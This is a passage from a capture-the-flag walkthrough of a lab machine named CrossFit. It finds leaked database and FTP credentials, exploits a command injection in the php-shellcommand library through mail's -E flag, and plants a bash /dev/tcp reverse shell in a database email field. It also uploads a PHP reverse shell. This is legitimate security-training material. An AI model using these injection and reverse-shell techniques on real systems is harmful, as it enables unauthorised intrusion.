<span class="n">ERROR</span> <span class="mi">1064</span> <span class="p">(</span><span class="mi">42000</span><span class="p">):</span> <span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">your</span> <span class="k">SQL</span> <span class="n">syntax</span><span class="p">;</span> <span class="k">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="k">to</span> <span class="n">your</span> <span class="n">MariaDB</span> <span class="n">server</span> <span class="k">version</span> <span class="k">for</span> <span class="n">the</span> <span class="k">right</span> <span class="n">syntax</span> <span class="k">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">'database'</span> <span class="k">at</span> <span class="n">line</span> <span class="mi">1</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">crossfit</span>           <span class="o">|</span>
<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">2</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">information_schema</span> <span class="p">;</span>
<span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="k">completion</span> <span class="k">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="k">names</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="k">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="k">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>

<span class="k">Database</span> <span class="n">changed</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">information_schema</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------------------------------------+</span>
<span class="o">|</span> <span class="n">Tables_in_information_schema</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------------------------+</span>
<span class="c1">---snipped---</span>
</pre></table></code></div></div><p>After looking at the folders in <code class="language-plaintext highlighter-rouge">/var/www</code> I remembered that I had found credentials for logging into MySQL there. I used the credentials to log into the database, but there was no useful information to be found. It only held information that was displayed on the website.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">'127.0.0.1'</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Your are not allowed to access this page."</span><span class="p">;</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Security Report<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;style&gt;</span>
    <span class="nt">table</span><span class="o">,</span> <span class="nt">th</span><span class="o">,</span> <span class="nt">td</span> <span class="p">{</span>
      <span class="nl">border</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="no">black</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h4&gt;</span>Logged XSS attempts<span class="nt">&lt;/h4&gt;</span>
<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;thead&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>Timestamp<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>User Agent<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>IP Address<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/thead&gt;</span>
<span class="nt">&lt;tbody&gt;</span>
<span class="cp">&lt;?php</span>
<span class="nv">$host</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$user</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
<span class="nv">$pass</span> <span class="o">=</span> <span class="s2">"oeLoo~y2baeni"</span><span class="p">;</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"crossfit"</span><span class="p">;</span>
<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'SELECT * FROM security_report LIMIT 1'</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="nf">fetch_array</span><span class="p">(</span><span class="no">MYSQLI_ASSOC</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;tr&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;td&gt;"</span> <span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'timestamp'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;td&gt;"</span> <span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'ua'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;td&gt;"</span> <span class="mf">.</span> <span class="nb">long2ip</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;/tr&gt;"</span><span class="p">;</span>
        <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'DELETE FROM security_report WHERE id='</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">/security_threat</code> folder there was a file called <code class="language-plaintext highlighter-rouge">reports.php</code> that held the code for reporting the detected XSS events to the admin. Apparently there was also another file that saved the report to the database, because this one only retrieved it, displayed it to the <code class="language-plaintext highlighter-rouge">reports.php</code> page when viewed, then deleted it from the database.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>hank@crossfit:/home/isaac/send_updates$ find / -group admins 2&gt;/dev/null
/home/isaac/send_updates
/home/isaac/send_updates/composer.lock
/home/isaac/send_updates/send_updates.php
/home/isaac/send_updates/composer.json
/etc/pam.d/chfn
/etc/pam.d/newusers
/etc/pam.d/vmtoolsd
/etc/pam.d/common-auth
/etc/pam.d/login
/etc/pam.d/systemd-user
/etc/pam.d/runuser-l
/etc/pam.d/common-account
/etc/pam.d/vsftpd.orig
/etc/pam.d/su
/etc/pam.d/vsftpd
/etc/pam.d/su-l
/etc/pam.d/chpasswd
/etc/pam.d/common-password
/etc/pam.d/common-session-noninteractive
/etc/pam.d/sshd
/etc/pam.d/common-session
/etc/pam.d/other
/etc/pam.d/chsh
/etc/pam.d/passwd
/etc/pam.d/cron
/etc/pam.d/runuser
</pre></table></code></div></div><p>I searched for files that <code class="language-plaintext highlighter-rouge">hank</code> could access as a member of the <code class="language-plaintext highlighter-rouge">admins</code> group, and found a bunch of them that were in the <code class="language-plaintext highlighter-rouge">/etc/pam.d</code> directory. This was quite interesting since PAM deals with user authentication.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>auth sufficient pam_mysql.so <span class="nv">user</span><span class="o">=</span>ftpadm <span class="nv">passwd</span><span class="o">=</span>8W<span class="o">)}</span>gpRJvAmnb <span class="nv">host</span><span class="o">=</span>localhost <span class="nv">db</span><span class="o">=</span>ftphosting <span class="nv">table</span><span class="o">=</span>accounts <span class="nv">usercolumn</span><span class="o">=</span>username <span class="nv">passwdcolumn</span><span class="o">=</span>pass <span class="nv">crypt</span><span class="o">=</span>3
account sufficient pam_mysql.so <span class="nv">user</span><span class="o">=</span>ftpadm <span class="nv">passwd</span><span class="o">=</span>8W<span class="o">)}</span>gpRJvAmnb <span class="nv">host</span><span class="o">=</span>localhost <span class="nv">db</span><span class="o">=</span>ftphosting <span class="nv">table</span><span class="o">=</span>accounts <span class="nv">usercolumn</span><span class="o">=</span>username <span class="nv">passwdcolumn</span><span class="o">=</span>pass <span class="nv">crypt</span><span class="o">=</span>3

<span class="c"># Standard behaviour for ftpd(8).</span>
auth    required        pam_listfile.so <span class="nv">item</span><span class="o">=</span>user <span class="nv">sense</span><span class="o">=</span>deny <span class="nv">file</span><span class="o">=</span>/etc/ftpusers <span class="nv">onerr</span><span class="o">=</span>succeed

<span class="c"># Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.</span>

<span class="c"># Standard pam includes</span>
@include common-account
@include common-session
@include common-auth
auth    required        pam_shells.so
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">/etc/pam.d</code> the file <code class="language-plaintext highlighter-rouge">vsftpd</code> contained the password for the user <code class="language-plaintext highlighter-rouge">ftpadm</code>.</p><h3 id="ftpadm"><code class="language-plaintext highlighter-rouge">ftpadm</code></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre><span class="c"># Set this to 'yes' to enable PAM authentication, account processing,</span>
<span class="c"># and session processing. If this is enabled, PAM authentication will</span>
<span class="c"># be allowed through the ChallengeResponseAuthentication and</span>
<span class="c"># PasswordAuthentication.  Depending on your PAM configuration,</span>
<span class="c"># PAM authentication via ChallengeResponseAuthentication may bypass</span>
<span class="c"># the setting of "PermitRootLogin without-password".</span>
<span class="c"># If you just want the PAM account and session checks to run without</span>
<span class="c"># PAM authentication, then enable this but set PasswordAuthentication</span>
<span class="c"># and ChallengeResponseAuthentication to 'no'.</span>
UsePAM <span class="nb">yes</span>

<span class="c">#AllowAgentForwarding yes</span>
<span class="c">#AllowTcpForwarding yes</span>
<span class="c">#GatewayPorts no</span>
X11Forwarding <span class="nb">yes</span>
<span class="c">#X11DisplayOffset 10</span>
<span class="c">#X11UseLocalhost yes</span>
<span class="c">#PermitTTY yes</span>
PrintMotd no
<span class="c">#PrintLastLog yes</span>
<span class="c">#TCPKeepAlive yes</span>
<span class="c">#PermitUserEnvironment no</span>
<span class="c">#Compression delayed</span>
<span class="c">#ClientAliveInterval 0</span>
<span class="c">#ClientAliveCountMax 3</span>
<span class="c">#UseDNS no</span>
<span class="c">#PidFile /var/run/sshd.pid</span>
<span class="c">#MaxStartups 10:30:100</span>
<span class="c">#PermitTunnel no</span>
<span class="c">#ChrootDirectory none</span>
<span class="c">#VersionAddendum none</span>

<span class="c"># no default banner path</span>
<span class="c">#Banner none</span>

<span class="c"># Allow client to pass locale environment variables</span>
AcceptEnv LANG LC_<span class="k">*</span>

<span class="c"># override default of no subsystems</span>
Subsystem       sftp    /usr/lib/openssh/sftp-server

<span class="c"># Example of overriding settings on a per-user basis</span>
<span class="c">#Match User anoncvs</span>
<span class="c">#       X11Forwarding no</span>
<span class="c">#       AllowTcpForwarding no</span>
<span class="c">#       PermitTTY no</span>
<span class="c">#       ForceCommand cvs server</span>
DenyUsers ftpadm
</pre></table></code></div></div><p>Unfortunately, the SSH configuration was set to explicitly deny <code class="language-plaintext highlighter-rouge">ftpadm</code> from logging in through SSH. I could also see that it was configured to run the subsystem for SFTP.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no"                                  1 ⨯
Password: 
lftp ftpadm@10.10.10.208:~&gt; ls                   
drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
</pre></table></code></div></div><p>I tried instead to log in through FTP once again. This time, there was only one folder <code class="language-plaintext highlighter-rouge">messages</code>, which I had read-write access to, but was empty. Once again I uploaded a reverse shell and tried to execute it, but I wasn’t sure where the folder was in the filesystem. I decided to keep this in mind as I continued my enumeration.</p><h3 id="send_updatesphp">send_updates.php</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">MAILTO</span><span class="o">=</span><span class="s2">""</span>
<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="c"># Example of job definition:</span>
<span class="c"># .---------------- minute (0 - 59)</span>
<span class="c"># |  .------------- hour (0 - 23)</span>
<span class="c"># |  |  .---------- day of month (1 - 31)</span>
<span class="c"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c"># |  |  |  |  |</span>
<span class="c"># *  *  *  *  * user-name command to be executed</span>
17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
<span class="k">*</span>  <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
<span class="c">#</span>
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">/etc/crontab</code> there was a cron running every minute. This cron ran the script <code class="language-plaintext highlighter-rouge">/home/isaac/send_updates/send_updates.php</code> as the user <code class="language-plaintext highlighter-rouge">isaac</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="cd">/***************************************************
 * Send email updates to users in the mailing list *
 ***************************************************/</span>
<span class="k">require</span><span class="p">(</span><span class="s2">"vendor/autoload.php"</span><span class="p">);</span>
<span class="k">require</span><span class="p">(</span><span class="s2">"includes/functions.php"</span><span class="p">);</span>
<span class="k">require</span><span class="p">(</span><span class="s2">"includes/db.php"</span><span class="p">);</span>
<span class="k">require</span><span class="p">(</span><span class="s2">"includes/config.php"</span><span class="p">);</span>
<span class="kn">use</span> <span class="nc">mikehaertl\shellcommand\Command</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$fs_iterator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FilesystemIterator</span><span class="p">(</span><span class="nv">$msg_dir</span><span class="p">);</span>

    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$fs_iterator</span> <span class="k">as</span> <span class="nv">$file_info</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$file_info</span><span class="o">-&gt;</span><span class="nf">isFile</span><span class="p">())</span>
        <span class="p">{</span>
            <span class="nv">$full_path</span> <span class="o">=</span> <span class="nv">$file_info</span><span class="o">-&gt;</span><span class="nf">getPathname</span><span class="p">();</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'SELECT email FROM users'</span><span class="p">);</span>
            <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="nf">fetch_array</span><span class="p">(</span><span class="no">MYSQLI_ASSOC</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="nv">$command</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Command</span><span class="p">(</span><span class="s1">'/usr/bin/mail'</span><span class="p">);</span>
                <span class="nv">$command</span><span class="o">-&gt;</span><span class="nf">addArg</span><span class="p">(</span><span class="s1">'-s'</span><span class="p">,</span> <span class="s1">'CrossFit Club Newsletter'</span><span class="p">,</span> <span class="nv">$escape</span><span class="o">=</span><span class="kc">true</span><span class="p">);</span>
                <span class="nv">$command</span><span class="o">-&gt;</span><span class="nf">addArg</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span> <span class="nv">$escape</span><span class="o">=</span><span class="kc">true</span><span class="p">);</span>

                <span class="nv">$msg</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$full_path</span><span class="p">);</span>
                <span class="nv">$command</span><span class="o">-&gt;</span><span class="nf">setStdIn</span><span class="p">(</span><span class="s1">'test'</span><span class="p">);</span>
                <span class="nv">$command</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nb">unlink</span><span class="p">(</span><span class="nv">$full_path</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nf">cleanup</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>In the folder <code class="language-plaintext highlighter-rouge">/home/isaac/send_updates</code> I found the <code class="language-plaintext highlighter-rouge">send_updates.php</code> file. Reading through the code, it seemed as if it was created to email the “CrossFit Club Newsletter” automatically to all users in the database (once a minute?! talk about spam!). The <code class="language-plaintext highlighter-rouge">mail</code> command was being run by the <code class="language-plaintext highlighter-rouge">mikehaertl\shellcommand\Command</code> library, which after a short search I found on GitHub.</p><ul><li><a href="https://github.com/mikehaertl/php-shellcommand">https://github.com/mikehaertl/php-shellcommand</a></ul><blockquote><p>php-shellcommand provides a simple object oriented interface to execute shell commands.</p></blockquote><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">{</span>
    <span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">mikehaertl/php-shellcommand</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1.6.0</span><span class="dl">"</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">composer.json</code> showed the version of this library was 1.6.0. A web search showed that this was vulnerable to command injection.</p><ul><li><a href="https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426">https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426</a></ul><p>Since this library is used to execute arbitrary commands, and there was no kind of filtering being done on the <code class="language-plaintext highlighter-rouge">email</code> parameter, this could be used to inject other commands.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre>hank@crossfit:/home/isaac/send_updates$ mail --help
Usage: mail [OPTION...] [address...]
  or:  mail [OPTION...] [OPTION...] [file]
  or:  mail [OPTION...] --file [OPTION...] [file]
  or:  mail [OPTION...] --file=file [OPTION...]
GNU mail -- process mail messages.
If -f or --file is given, mail operates on the mailbox named by the first
argument, or the user's mbox, if no argument given.

  -A, --attach=FILE          attach FILE
  -a, --append=HEADER: VALUE append given header to the message being sent
      --[no-]alternative     force multipart/alternative content type
      --attach-fd=FD         attach from file descriptor FD
      --content-filename=NAME
                             set the Content-Disposition filename parameter for
                             the next --attach option
      --content-name=NAME    set the Content-Type name parameter for the next
                             --attach option
      --content-type=TYPE    set content type for subsequent --attach options
  -E, --exec=COMMAND         execute COMMAND
  -e, --exist                return true if mail exists
      --encoding=NAME        set encoding for subsequent --attach options
  -F, --byname               save messages according to sender
  -H, --headers              write a header summary and exit
  -i, --ignore               ignore interrupts
  -M, --[no-]mime            compose MIME messages
  -N, --nosum                do not display initial header summary
  -n, --norc                 do not read the system mailrc file
  -p, --print, --read        print all mail to standard output
  -q, --quit                 cause interrupts to terminate program
  -r, --return-address=ADDRESS
                             use address as the return address when sending
                             mail
  -s, --subject=SUBJ         send a message with the given SUBJECT
      --[no-]skip-empty-attachments
                             skip attachments with empty body
  -t, --to                   read recipients from the message header
  -u, --user=USER            operate on USER's mailbox

 Global debugging settings
      --debug-level=LEVEL    set Mailutils debugging level
      --[no-]debug-line-info show source info with debugging messages

 Configuration handling
      --config-file=FILE     load this configuration file; implies --no-config
      --config-lint          check configuration file syntax and exit
      --config-verbose       verbosely log parsing of the configuration files
      --no-config            do not load site and user configuration files
      --no-site-config       do not load site-wide configuration file
      --no-user-config       do not load user configuration file
      --set=PARAM=VALUE      set configuration parameter

 Informational options
      --config-help          show configuration file summary
      --show-config-options  show compilation options

  -?, --help                 give this help list
      --usage                give a short usage message
  -V, --version              print program version

Mandatory or optional arguments to long options are also mandatory or optional
for any corresponding short options.

Report bugs to &lt;bug-mailutils@gnu.org&gt;.
GNU Mailutils home page: &lt;http://mailutils.org&gt;
General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt;
</pre></table></code></div></div><p>Looking at the <code class="language-plaintext highlighter-rouge">mail</code> program’s help, I noticed that there was a flag <code class="language-plaintext highlighter-rouge">-E</code> that allowed for execution of commands. Since I already had the credentials to the database, it seemed likely that I could create an entry in the user’s table that contained code I wanted to execute as <code class="language-plaintext highlighter-rouge">isaac</code> in the email field of the database to be loaded and run within<code class="language-plaintext highlighter-rouge">send_updates.php</code>. <code class="language-plaintext highlighter-rouge">isaac</code> did not have a <code class="language-plaintext highlighter-rouge">.ssh</code> folder to insert my public key to, so I needed to craft a reverse shell instead.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>hank@crossfit:/home/isaac$ mysql -u crossfit -p -D crossfit
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11007
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [crossfit]&gt; select * from users
users        users.email  users.id     
MariaDB [crossfit]&gt; INSERT INTO users (id, email) VALUES ("1", "-E $(bash -i &gt;&amp; /dev/tcp/10.10.15.98/8099)");
Query OK, 1 row affected (0.003 sec)

MariaDB [crossfit]&gt; select * from users;
+----+------------------------------------------------------------+
| id | email                                                      |
+----+------------------------------------------------------------+
|  1 | -E $(bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.176/8099 0&gt;&amp;1') |
+----+------------------------------------------------------------+
1 row in set (0.000 sec)
</pre></table></code></div></div><p>I logged into MySQL using the same credentials as before, and checked for the field names in the <code class="language-plaintext highlighter-rouge">user</code> table so I knew how to frame my query to insert my reverse shell into the correct field. I assumed that the <code class="language-plaintext highlighter-rouge">id</code> field was set to <code class="language-plaintext highlighter-rouge">AUTO_INCREMENT</code>, but just in case I set it to the value “1” to ensure my code would be the first entry. The script from earlier said it pulled only the first entry.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ nc -lvnp 8099
listening on [any] 8099 ...
connect to [10.10.14.176] from (UNKNOWN) [10.10.10.208] 53362
bash: cannot set terminal process group (1855): Inappropriate ioctl for device
bash: no job control in this shell
isaac@crossfit:~$ test
isaac@crossfit:~$ exit
</pre></table></code></div></div><p>I got a connection back from my injected code, however it also immediately ran two commands ( I did not type these: <code class="language-plaintext highlighter-rouge">test</code> and <code class="language-plaintext highlighter-rouge">exit</code>) which caused it to disconnect. I also could not get the same injected command to work later for some reason. I had no idea what was broken here, or why those commands got run.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$fs_iterator</span> <span class="o">=</span> new FilesystemIterator<span class="o">(</span><span class="nv">$msg_dir</span><span class="o">)</span><span class="p">;</span>

    foreach <span class="o">(</span><span class="nv">$fs_iterator</span> as <span class="nv">$file_info</span><span class="o">)</span>
    <span class="o">{</span>
        <span class="k">if</span><span class="o">(</span><span class="nv">$file_info</span>-&gt;isFile<span class="o">())</span>
</pre></table></code></div></div><p>I looked back through the code in <code class="language-plaintext highlighter-rouge">send_updates.php</code> looking for clues for how to proceed. I noticed that these loops look through everything in <code class="language-plaintext highlighter-rouge">$msgdir</code> and check to see if there was a file, and if so, it would run the rest of the code.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no" 
Password: 
lftp ftpadm@10.10.10.208:~&gt; put ~/rev-php.php    
put: /home/zweilos/rev-php.php: Access failed: 553 Could not create file. (rev-php.php)
lftp ftpadm@10.10.10.208:/&gt; cd messages/
lftp ftpadm@10.10.10.208:/messages&gt; put ~/rev-php.php 
73 bytes transferred
